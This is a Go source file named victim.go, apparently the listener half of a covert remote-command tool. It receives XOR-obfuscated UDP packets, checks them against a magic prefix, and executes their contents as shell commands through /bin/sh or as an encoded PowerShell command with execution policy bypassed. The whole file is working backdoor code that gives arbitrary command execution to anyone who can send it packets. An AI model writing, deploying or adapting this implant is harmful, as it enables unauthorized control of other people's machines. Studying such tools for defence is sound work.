package main

/*
 * victim.go
 * Catch datagrams, execute commands
 * By J. Stuart McMurray
 * Created 20160221
 * Last Modified 20160221
 */

import (
	"bytes"
	"encoding/base64"
	"log"
	"net"
	"os/exec"
	"runtime"
	"sync"
)

func victim(addr string) {
	/* Listen on the given address */
	l := listen(addr)
	log.Printf("Listening on %v", l.LocalAddr())

	/* Wait for packets, handle */
	buf := make([]byte, MSGLEN+1)
	for {
		/* Pop a packet */
		n, a, err := l.ReadFromUDP(buf)
		if nil != err {
			log.Fatalf("Error receiving: %v", err)
		}
		/* Make sure it's the right size */
		if MSGLEN != n {
			log.Printf("%v - %v byte packet: %q", a, n, buf)
			continue
		}

		/* Handle it */
		cpy := make([]byte, n)
		copy(cpy, buf)
		go handle(cpy, a)
	}
}

/* listen listens for UDP packets on addr */
func listen(addr string) *net.UDPConn {
	a, err := net.ResolveUDPAddr("udp", addr)
	if nil != err {
		log.Fatalf("Unable to resolve %q: %v", addr, err)
	}
	l, err := net.ListenUDP("udp", a)
	if nil != err {
		log.Fatalf("Unable to listen on %v: %v", a, err)
	}
	return l
}

/* handle deXORs an incoming packet from a, checks that it's valid, and runs
the command. */
var cmdCount = 0 /* Command counter */
var ccLock = &sync.Mutex{}

func handle(buf []byte, a *net.UDPAddr) {
	/* Un-XOR and remove the magic from the packet */
	payload, ok := rmMagic(unXOR(buf))
	if !ok {
		log.Printf("%v - Bad magic: %02X", a, buf)
		return
	}
	/* Get the number of this command */
	ccLock.Lock()
	cc := cmdCount
	cmdCount++
	ccLock.Unlock()
	/* Log what we got */
	log.Printf("%v - [%v] %q", a, cc, payload)
	/* Execute the payload */
	if "windows" == runtime.GOOS {
		executeWin(payload, a, cc)
		return
	}
	executeNix(payload, a, cc)
}

/* unXOR returns the un-xored version of the packet */
func unXOR(buf []byte) []byte {
	xorb := buf[0]
	packet := buf[1:]
	for i, v := range packet {
		packet[i] = v ^ xorb
	}
	return bytes.TrimRight(packet, "\x00")
}

/* rmMagic removes the magic from a packet, and returns whether or not it was
what was expected */
func rmMagic(buf []byte) ([]byte, bool) {
	good := 0
	for i, v := range MAGIC {
		if buf[i] != v {
			/* This is a bad idea if len(buf) >= MAXINT */
			good++
		}
	}
	return buf[len(MAGIC):], good == 0
}

/* executeWin executes a payload on a Windows box.  Golly */
func executeWin(c []byte, a *net.UDPAddr, cc int) {
	/* This may or may not work, we should warn the user. */
	log.Printf("This hasn't actually been tested and probably needs " +
		"some polish...")
	/* Make a command, run it */
	if err := exec.Command(
		"powershell.exe",
		"-ExecutionPolicy", "Bypass",
		"-NoLogo",
		"-NoInteractive",
		"-NoProfile",
		"-EncodedCommand", base64.StdEncoding.EncodeToString(c),
	).Run(); nil != err {
		log.Printf("%v - [%v] failed: %v", a, cc, err)
	}
	log.Printf("%v - [%v] done.", a, cc)
}

/* executeNix executes the payload with /bin/sh */
func executeNix(c []byte, a *net.UDPAddr, cc int) {
	cmd := exec.Command("/bin/sh", "-c", string(c))
	cmd.Stdin = bytes.NewBuffer(c)
	if err := cmd.Run(); nil != err {
		log.Printf("%v - [%v] failed: %v", a, cc, err)
	}
	log.Printf("%v - [%v] done.", a, cc)
}
